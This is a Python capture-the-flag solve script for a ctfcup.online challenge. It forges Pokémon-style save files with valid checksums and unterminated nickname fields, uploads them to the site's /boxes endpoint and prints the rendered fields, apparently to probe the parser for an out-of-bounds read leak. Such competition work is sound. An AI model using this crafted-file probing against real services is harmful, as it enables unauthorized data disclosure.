import os, sys, struct, requests, re, html
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
try:
    for k,v in eval(open("artifacts/cookie.txt").read()).items(): s.cookies.set(k,v)
except Exception as e: print("cookie err",e)
REV={}
for line in open("artifacts/map.txt"):
    b,_,r=line.partition(' ')
    try: ch=html.unescape(eval(r.strip()))
    except Exception: continue
    if len(ch)==4 and len(set(ch))==1: REV.setdefault(ch[0], int(b,16))
for i,c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"): REV.setdefault(c,0xBB+i)
for i,c in enumerate("abcdefghijklmnopqrstuvwxyz"): REV.setdefault(c,0xD5+i)
for i,c in enumerate("0123456789"): REV.setdefault(c,0xA1+i)
def enc(t): return bytes(REV.get(c,0x00) for c in t)
def checksum(data):
    t=0
    for i in range(0,len(data)-len(data)%4,4): t=(t+struct.unpack_from('<I',data,i)[0])&0xFFFFFFFF
    return ((t&0xFFFF)+(t>>16))&0xFFFF
SIZES={0:3884,1:3968,2:3968,3:3968,4:3848,5:3968,6:3968,7:3968,8:3968,9:3968,10:3968,11:3968,12:3968,13:2000}
def make_save(party, boxes_raw=None):
    buf=bytearray(0x20000)
    def sec(idx,counter,data):
        sc=bytearray(0x1000); sc[0:len(data)]=data
        struct.pack_into('<H',sc,0xFF4,idx); struct.pack_into('<H',sc,0xFF6,checksum(sc[0:SIZES.get(idx,3968)]))
        struct.pack_into('<I',sc,0xFF8,0x08012025); struct.pack_into('<I',sc,0xFFC,counter)
        buf[idx*0x1000:(idx+1)*0x1000]=sc
    s0=bytearray(SIZES[0]); s0[0:8]=b"AGENT\xff\x00\x00"; struct.pack_into('<I',s0,0x0A,12345); sec(0,100,s0)
    s1=bytearray(SIZES[1]); struct.pack_into('<I',s1,0x234,len(party))
    for i,p in enumerate(party): s1[0x238+i*100:0x238+(i+1)*100]=p
    sec(1,100,s1)
    for i in range(2,14): sec(i,100,bytes(SIZES[i]))
    return bytes(buf)
def rawrec(nickfield_bytes, rest=b''):
    p=bytearray(100); struct.pack_into('<I',p,0,0x12345678); struct.pack_into('<I',p,4,12345)
    nb=nickfield_bytes[:10]
    p[8:8+len(nb)]=nb
    return bytes(p)
def upload(title, party):
    sv=make_save(party)
    r=s.post(BASE+"/boxes",data={"title":title,"description":"d"},files={'save':('x.sav',sv)},timeout=30,allow_redirects=False)
    if r.status_code!=303: print(title,"FAIL",r.status_code,r.text[:200]); return
    t=s.get(r.headers['location'],timeout=20).text
    m=re.search(r'<p class="card-line">(.*?)</p>',t,re.S)
    n=re.findall(r'<span class="nick">(.*?)</span>',t,re.S)
    print(title,"CHANT:",repr(m.group(1)) if m else None)
    print(title,"NICKS:",[repr(x) for x in n])
# 1: nickname 10 bytes 'A' no terminator
upload("no-term-10",[rawrec(enc("A"*10))])
# 2: nickname 9 bytes then 0x00 (space) no FF
upload("no-term-9",[rawrec(enc("B"*9))])
# 3: 0xFF placed at end of record (position 99) i.e. no terminator in nickname field
p=bytearray(100); p[8:18]=enc("C"*10); p[99]=0xFF
upload("ff-at-99",[bytes(p)])
# 4: two mons, first no terminator
p2=bytearray(100); p2[8:18]=enc("D"*10)
upload("two",[bytes(p2),rawrec(enc("E"*10))])
